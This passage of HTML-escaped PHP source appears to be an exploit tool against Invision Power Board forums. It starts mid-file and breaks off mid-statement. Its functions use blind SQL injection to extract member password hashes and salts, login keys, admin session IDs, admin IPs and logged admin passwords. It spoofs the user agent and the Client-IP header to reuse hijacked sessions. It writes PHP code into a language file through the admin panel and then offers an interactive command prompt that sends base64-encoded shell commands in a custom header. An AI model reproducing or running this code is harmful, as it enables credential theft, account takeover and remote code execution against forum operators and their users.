&nbsp;$this-&gt;msg&#40;'Using table prefix '.$this-&gt;p_pre, 1&#41;;<br /><br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function set_sql_focus&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_uname = $this-&gt;get_p&#40;'uname'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_uid&nbsp; &nbsp;= $this-&gt;get_p&#40;'uid'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;p_uname &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Using targeted username '.$this-&gt;p_uname, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;elseif&#40; $this-&gt;p_uid &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Using targeted user id '.$this-&gt;p_uid, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Target<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !&#40;$this-&gt;p_uname || $this-&gt;p_uid&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Default uid if not precised<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Using default user id: 1', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_uid = 1;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;# Focus on ?<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;p_uname &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_on = 'members_l_username=\''.addslashes&#40;$this-&gt;p_uname&#41;.'\'';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_on = 'id='.&#40;int&#41;$this-&gt;p_uid;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function exec_code&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;write_code&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;while&#40; $this-&gt;cmd_prompt&#40;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;addheader&#40;'My-Code', $this-&gt;cmd&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;get&#40;$this-&gt;p_url&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;print &quot;\n&quot;.$this-&gt;get_answer&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;0&#41;;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_answer&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$res_a = explode&#40;$this-&gt;res_sep, $this-&gt;web-&gt;getcontent&#40;&#41;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$res_a&#91;1&#93; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;return 'No result to retrieve';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;return $res_a&#91;1&#93;;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function cmd_prompt&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cmd = $this-&gt;msg&#40;'root@ipb: ', 1, 1, 0, true&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !ereg&#40;'^&#40;quit|exit&#41;$', $this-&gt;cmd&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cmd = base64_encode&#40;$this-&gt;cmd&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;cmd = str_replace&#40;'%CMD%', $this-&gt;cmd, $this-&gt;php_send&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return TRUE;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return FALSE;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function write_code&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Gimme the language ID<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;get_def_lang&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Current lang settings<br />&nbsp; &nbsp;&nbsp; &nbsp;$p_dat =<br />&nbsp; &nbsp;&nbsp; &nbsp;'code=edit2&amp;act=lang&amp;id='.$this-&gt;g_lid.'&amp;section'.<br />&nbsp; &nbsp;&nbsp; &nbsp;'=lookandfeel&amp;lang_file=lang_boards.php';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;post&#40;$this-&gt;a_url, $p_dat&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;# We collect each variable name / value<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; preg_match_all&#40;$this-&gt;reg_lvar, $this-&gt;web-&gt;getcontent&#40;&#41;, $l_vars&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# POST data <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$p_dat =<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;'code=doedit&amp;act=lang&amp;id='.$this-&gt;g_lid.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;'&amp;lang_file=lang_boards.php&amp;section=lo'.<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;'okandfeel&amp;';<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# &amp;Name=Value<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;for&#40; $i=0; $i&lt;count&#40;$l_vars&#91;0&#93;&#41;; $i++ &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$p_dat .=<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;'&amp;XX_'.$l_vars&#91;1&#93;&#91;$i&#93;.'='.urlencode&#40;$l_vars&#91;2&#93;&#91;$i&#93;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# We write our PHP code in the first variable<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $i == 0 &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$p_dat .= $this-&gt;php_write;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Go on<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;post&#40;$this-&gt;a_url, $p_dat&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'PHP code written', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# WTF :!<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Can\'t find block variables', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_def_lang&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to get the set language id', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;get&#40;$this-&gt;a_url.'&amp;section=lookandfeel&amp;act=lang'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; preg_match&#40;$this-&gt;reg_lang, $this-&gt;web-&gt;getcontent&#40;&#41;, $lids&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;g_lid = $lids&#91;1&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Using language id '.$this-&gt;g_lid, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Can\'t get the default language id', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function is_logged&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;bypass_matches&#40;&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;# User session ok ?<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;s_admin &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$match = 'act=Login&amp;amp;CODE=03';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;addcookie&#40;$this-&gt;s_cprefix.'session_id', $this-&gt;s_sess&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;get&#40;$this-&gt;p_url&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Admin session ok ?<br />&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$match = '&amp;section=';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;get&#40;$this-&gt;a_url&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; preg_match&#40;&quot;/$match/i&quot;, $this-&gt;web-&gt;getcontent&#40;&#41;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;return true;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;return false;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function bypass_matches&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;# match_browser<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;agent&#40;$this-&gt;s_agent&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# match_ipaddress<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;addheader&#40;'Client-IP', $this-&gt;s_ip&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_cprefix&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to get the cookie prefix', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Set-Cookie: session_id=...; path=/<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;get&#40;$this-&gt;p_url&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_cprefix = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;web-&gt;cookie &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;foreach&#40; $this-&gt;web-&gt;cookie as $name =&gt; $value&#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; preg_match&#40;$this-&gt;reg_cpre, $name, $cmatches&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_cprefix = $cmatches&#91;1&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;s_cprefix &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'No cookie prefix set', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Using cookie prefix '.$this-&gt;s_cprefix, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_sec_options&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;# If no value, take the default one<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;get_conf&#40;'t.conf_value'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;get_conf&#40;'t.conf_default'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_conf&#40;$field&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table = 'conf_settings';&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field = $field;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; = $this-&gt;chr_num;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_add_0 = &quot;AND t.conf_key='match_browser'&quot;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;conf&#91;'browser'&#93; === '' &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;conf&#91;'browser'&#93; = $this-&gt;bf_inj&#40;&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_add_0 = &quot;AND t.conf_key='match_ipaddress'&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;conf&#91;'ip'&#93; === '' &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;conf&#91;'ip'&#93; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_add_0 = &quot;AND t.conf_key='xforward_matching'&quot;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;conf&#91;'xforward'&#93; === '' &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;conf&#91;'xforward'&#93; = $this-&gt;bf_inj&#40;&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_login_key&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'login_key';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'members';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.member_login_key';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.id=m.id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_md5;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'login_key'&#93; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_sql_user&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'user&#40;&#41;';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'members';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'user&#40;&#41;';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_all;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_end&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= '@';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'sql_user'&#93;&nbsp; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_pass_hash&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'pass_hash';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'members_converge';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.converge_pass_hash';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.converge_email=m.email';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_md5;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'pass_hash'&#93; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_pass_salt&#40;&#41;<br />&nbsp; &nbsp;&#123;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'pass_salt';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'members_converge';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.converge_pass_salt';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.converge_email=m.email';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_all;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'pass_salt'&#93; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_admin_sess&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'admin_sid';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'admin_sessions';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.session_id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.session_member_id=m.id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_sel&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.session_log_in_time';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_md5;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'a_sess_id'&#93; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_admin_ip&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'admin_ip';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'admin_sessions';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.session_ip_address';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.session_member_id=m.id';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_sel&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.session_log_in_time';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_char&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = $this-&gt;chr_ip;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;data&#91;'a_ip_addr'&#93; = $this-&gt;bf_inj&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return $this-&gt;key_val;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function get_admin_pwd&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;init_sql&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_key&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'admin_pwd';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_table&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 'admin_login_logs';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_field&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= 't.admin_post_details';<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;t_join&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 't.admin_username=m.members_l_username';<br 